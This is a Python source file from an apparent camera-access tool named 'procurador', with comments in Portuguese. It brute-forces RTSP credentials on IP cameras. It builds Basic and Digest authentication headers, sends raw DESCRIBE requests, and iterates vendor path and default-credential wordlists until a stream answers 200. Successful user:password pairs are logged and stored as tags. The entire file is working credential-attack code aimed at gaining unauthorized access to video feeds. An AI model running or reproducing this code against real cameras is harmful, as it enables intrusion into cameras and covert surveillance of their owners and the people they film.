"""
Brute force de credenciais RTSP.

Suporta:
- Basic Auth (base64) — RFC 7617
- Digest Auth (MD5 hash) — RFC 2617

Implementa Técnica 5 do pipeline de acesso:
- Tenta paths do fabricante + genérico
- Para cada path que responde 401, testa credenciais
"""

from __future__ import annotations

import hashlib
import secrets
import time

from procurador.core.models import (
    AccessMethod,
    Camera,
    CameraStatus,
    RTSPProbe,
)
from procurador.core.scanner import probe_rtsp
from procurador.core.wordlists import get_creds_for_vendor
from procurador.utils.logger import get_logger

logger = get_logger(__name__)


# =====================================================================
# Digest Auth (RFC 2617)
# =====================================================================


def _md5(data: bytes) -> str:
    """MD5 hex digest."""
    return hashlib.md5(data).hexdigest()


def _compute_digest_response(
    user: str,
    realm: str,
    password: str,
    method: str,
    uri: str,
    nonce: str,
    qop: str | None = None,
    nc: str = "00000001",
    cnonce: str | None = None,
) -> str:
    """Calcula o response hash para Digest Auth (RFC 2617).

    Args:
        user, realm, password: Credenciais.
        method, uri: Request method + URI.
        nonce, qop, nc, cnonce: Parâmetros do challenge.

    Returns:
        Hash hex do response.
    """
    ha1 = _md5(f"{user}:{realm}:{password}".encode())
    ha2 = _md5(f"{method}:{uri}".encode())

    if qop in ("auth", "auth-int"):
        if cnonce is None:
            cnonce = secrets.token_hex(8)
        return _md5(f"{ha1}:{nonce}:{nc}:{cnonce}:{qop}:{ha2}".encode())
    return _md5(f"{ha1}:{nonce}:{ha2}".encode())


def _build_digest_auth(
    user: str,
    password: str,
    uri: str,
    method: str,
    realm: str,
    nonce: str,
    qop: str | None = None,
    opaque: str | None = None,
    algorithm: str = "MD5",
) -> str:
    """Constrói header Authorization Digest completo."""
    nc = "00000001"
    cnonce = secrets.token_hex(8)
    response = _compute_digest_response(
        user,
        realm,
        password,
        method,
        uri,
        nonce,
        qop,
        nc,
        cnonce,
    )
    parts = [
        f'username="{user}"',
        f'realm="{realm}"',
        f'nonce="{nonce}"',
        f'uri="{uri}"',
        f'response="{response}"',
        f"algorithm={algorithm}",
    ]
    if qop:
        parts.append(f"qop={qop}")
        parts.append(f"nc={nc}")
        parts.append(f'cnonce="{cnonce}"')
    if opaque:
        parts.append(f'opaque="{opaque}"')
    return "Digest " + ", ".join(parts)


# =====================================================================
# RTSP brute
# =====================================================================


def _try_rtsp_basic(
    ip: str,
    port: int,
    path: str,
    user: str,
    password: str,
    timeout: float = 3.0,
) -> RTSPProbe | None:
    """Tenta RTSP com Basic Auth."""
    return probe_rtsp(ip, port, path, user=user, password=password, timeout=timeout)


def _try_rtsp_digest(
    ip: str,
    port: int,
    path: str,
    user: str,
    password: str,
    realm: str,
    nonce: str,
    qop: str | None = None,
    timeout: float = 3.0,
) -> RTSPProbe | None:
    """Tenta RTSP com Digest Auth via socket raw.

    Como o `probe_rtsp` ainda não suporta digest diretamente, implementamos
    aqui o envio do pedido.
    """
    import socket

    sock: socket.socket | None = None
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        start = time.monotonic()
        sock.connect((ip, port))

        url = f"rtsp://{ip}:{port}{path}"
        cseq = 1
        auth_header = _build_digest_auth(
            user,
            password,
            path,
            "DESCRIBE",
            realm,
            nonce,
            qop,
        )

        req = (
            f"DESCRIBE {url} RTSP/1.0\r\n"
            f"CSeq: {cseq}\r\n"
            f"Accept: application/sdp\r\n"
            f"Authorization: {auth_header}\r\n"
            f"User-Agent: Procurador/1.0\r\n"
            "\r\n"
        )
        sock.sendall(req.encode("latin-1", errors="ignore"))

        data = b""
        sock.settimeout(timeout)
        while True:
            try:
                chunk = sock.recv(4096)
            except TimeoutError:
                break
            if not chunk:
                break
            data += chunk
            if b"\r\n\r\n" in data:
                sock.settimeout(0.3)
                try:
                    extra = sock.recv(8192)
                    if extra:
                        data += extra
                except TimeoutError:
                    pass
                break

        elapsed_ms = (time.monotonic() - start) * 1000
        raw = data.decode("latin-1", errors="ignore")
        if not raw.strip():
            return None

        # Parsear resposta
        from procurador.core.scanner import _parse_rtsp_response

        status_code, status_text, headers = _parse_rtsp_response(raw)
        if status_code == 0:
            return None

        sdp_body = None
        if "\r\n\r\n" in raw:
            sdp_body = raw.split("\r\n\r\n", 1)[1][:4096]

        return RTSPProbe(
            methods=[m.strip() for m in headers.get("public", "").split(",") if m.strip()],
            public_header=headers.get("public"),
            server_header=headers.get("server"),
            sdp_body=sdp_body,
            status_code=status_code,
            status_text=status_text,
            response_time_ms=elapsed_ms,
            auth_header=headers.get("www-authenticate"),
            auth_realm=realm,
            auth_nonce=nonce,
            auth_method="Digest",
        )
    except Exception as e:
        logger.debug(f"digest auth {ip}:{port}{path} err: {e}")
        return None
    finally:
        if sock:
            try:
                sock.close()
            except Exception:
                pass


def _try_rtsp_creds(
    ip: str,
    port: int,
    path: str,
    user: str,
    password: str,
    probe_401: RTSPProbe,
    timeout: float = 3.0,
) -> RTSPProbe | None:
    """Tenta creds RTSP, Basic ou Digest consoante o challenge."""
    method = (probe_401.auth_method or "").lower()

    if method == "digest":
        realm = probe_401.auth_realm or "IP Camera"
        nonce = probe_401.auth_nonce or ""
        # Parsear qop
        qop: str | None = None
        if probe_401.auth_header and 'qop="' in probe_401.auth_header:
            try:
                qop = probe_401.auth_header.split('qop="', 1)[1].split('"', 1)[0]
            except IndexError:
                qop = None
        if not nonce:
            return None
        return _try_rtsp_digest(ip, port, path, user, password, realm, nonce, qop, timeout)
    else:
        # Default: Basic
        return _try_rtsp_basic(ip, port, path, user, password, timeout)


# =====================================================================
# Brute pipeline
# =====================================================================


def brute_rtsp_paths(
    camera: Camera,
    paths_to_try: list[str],
    creds: list[tuple[str, str]],
    timeout: float = 3.0,
    max_attempts: int = 100,
) -> Camera:
    """Tenta múltiplos paths RTSP e credenciais.

    Args:
        camera: Camera (já deve ter auth_required=True).
        paths_to_try: Lista de paths a tentar.
        creds: Lista de (user, pass).
        timeout: Timeout por tentativa.
        max_attempts: Limite total de tentativas (paths * creds).

    Returns:
        Camera atualizada.
    """
    attempts = 0
    for path in paths_to_try:
        if attempts >= max_attempts:
            break

        # 1. Tentar sem auth
        probe = probe_rtsp(camera.ip, camera.port, path, timeout=timeout)
        attempts += 1
        if probe is None:
            continue
        if probe.status_code == 200:
            camera.rtsp_path = path
            camera.rtsp_url = f"rtsp://{camera.ip}:{camera.port}{path}"
            camera.rtsp_probe = probe
            camera.status = CameraStatus.LIVE
            camera.auth_required = False
            camera.auth_success = True
            camera.access_method = AccessMethod.RTSP_NO_AUTH
            camera.tags.append("no-auth")
            logger.info(f"🟢 LIVE (no-auth, path) {camera.ip}:{camera.port}{path}")
            return camera
        if probe.status_code != 401:
            # 404, 403, etc — path não existe ou erro
            continue

        # 2. Tentar credenciais
        camera.rtsp_probe = probe
        camera.rtsp_path = path
        camera.auth_required = True

        for user, pwd in creds:
            if attempts >= max_attempts:
                break
            attempts += 1
            try:
                result = _try_rtsp_creds(camera.ip, camera.port, path, user, pwd, probe, timeout)
            except Exception as e:
                logger.debug(f"try creds {camera.ip} err: {e}")
                continue
            if result and result.status_code == 200:
                camera.rtsp_path = path
                # Construir URL com creds
                if user:
                    camera.rtsp_url = f"rtsp://{user}:{pwd}@{camera.ip}:{camera.port}{path}"
                else:
                    camera.rtsp_url = f"rtsp://{camera.ip}:{camera.port}{path}"
                camera.rtsp_probe = result
                camera.status = CameraStatus.LIVE
                camera.auth_success = True
                camera.auth_user = user
                camera.auth_pass = pwd
                camera.auth_method = result.auth_method or "Basic"
                camera.access_method = AccessMethod.RTSP_BRUTE
                camera.tags.append(f"brute:{user}:{pwd}")
                logger.info(
                    f"🟢 LIVE (brute) {camera.ip}:{camera.port}{path} "
                    f"{user}:{pwd} ({result.auth_method})"
                )
                return camera
            elif result and result.status_code == 401:
                # Continuar — pode estar perto
                continue

    return camera


def brute_camera(
    camera: Camera,
    paths: list[str] | None = None,
    creds: list[tuple[str, str]] | None = None,
    timeout: float = 3.0,
    max_attempts: int = 100,
) -> Camera:
    """Pipeline principal de brute para uma câmara.

    Args:
        camera: Camera.
        paths: Paths a testar (default: vendor-specific + genéricos).
        creds: Credenciais (default: vendor-specific + genéricos).
        timeout: Timeout.
        max_attempts: Limite de tentativas.

    Returns:
        Camera atualizada.
    """
    from procurador.core.wordlists import get_paths_for_vendor

    if camera.status == CameraStatus.LIVE:
        return camera

    if paths is None:
        paths = get_paths_for_vendor(camera.vendor)[:20]
    if creds is None:
        creds = get_creds_for_vendor(camera.vendor, max_n=max_attempts)

    return brute_rtsp_paths(camera, paths, creds, timeout, max_attempts)
